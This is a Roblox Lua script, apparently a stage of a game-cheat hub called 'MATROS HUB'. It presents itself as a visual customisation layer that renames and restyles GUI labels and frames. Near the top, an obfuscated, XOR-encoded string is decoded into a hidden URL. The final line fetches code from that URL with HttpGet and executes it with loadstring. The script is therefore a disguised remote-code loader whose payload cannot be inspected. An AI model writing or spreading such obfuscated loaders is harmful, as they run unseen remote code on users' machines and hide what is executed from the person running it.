
--[[ STAGE 2: VISUAL CORE ]]
local Xc4_7N0cJNIDk="\006\027\096\101\111\061\057\062\072\126\093\027\091\162\180\177\133\185\147\150\145\229\157\238\244\195\251\203\214\153\213\038\045\244\058\002\008\002\023\020\101\030\114\126\118\008\066\091\089\088\169\186\173\191\132\078\149\142\159\235\179\152\224\246\240\206\034\212\038\052\041\211\007\023\005\062\099\110\114\106\117\116\065\022\076\089\094\112\123\126\066\137\153\138"local t7cgxb0iStPnrC33CeL7vS=161 local A2GXFasD4m32cgChsyB6v2=39 local B5hDXWjh4SNw13avYj55wj=1 local h9GgOVstirocWLwMZi7m6=7 local kaLNpZz3WWkDXhbNp6=17 local VFHCkwfR11KfpnJfNYO2zp=false local mRUnjqHQgZWZ=bit32 and bit32.bxor if not mRUnjqHQgZWZ then mRUnjqHQgZWZ=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local mZbQdlS6E6qi1GdE6N={}for R6bsnLTpP8YgE6iK7nqc=1,#Xc4_7N0cJNIDk do local kxEJ8XyS4JB9kVWUxSym=string.byte(Xc4_7N0cJNIDk,R6bsnLTpP8YgE6iK7nqc)local fOMdhltICSrGUrfW=(A2GXFasD4m32cgChsyB6v2+(R6bsnLTpP8YgE6iK7nqc*h9GgOVstirocWLwMZi7m6)+kaLNpZz3WWkDXhbNp6)%256 if B5hDXWjh4SNw13avYj55wj==0 then kxEJ8XyS4JB9kVWUxSym=(kxEJ8XyS4JB9kVWUxSym-fOMdhltICSrGUrfW)%256 mZbQdlS6E6qi1GdE6N[R6bsnLTpP8YgE6iK7nqc]=string.char(mRUnjqHQgZWZ(kxEJ8XyS4JB9kVWUxSym,t7cgxb0iStPnrC33CeL7vS))else kxEJ8XyS4JB9kVWUxSym=mRUnjqHQgZWZ(kxEJ8XyS4JB9kVWUxSym,t7cgxb0iStPnrC33CeL7vS)mZbQdlS6E6qi1GdE6N[R6bsnLTpP8YgE6iK7nqc]=string.char((kxEJ8XyS4JB9kVWUxSym-fOMdhltICSrGUrfW)%256)end end local aK1h5tAzOI4SNO5t=table.concat(mZbQdlS6E6qi1GdE6N)if VFHCkwfR11KfpnJfNYO2zp then aK1h5tAzOI4SNO5t=string.reverse(aK1h5tAzOI4SNO5t)end local mxYJl74kQd32=aK1h5tAzOI4SNO5t
local HubName = "MATROS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(mxYJl74kQd32))()
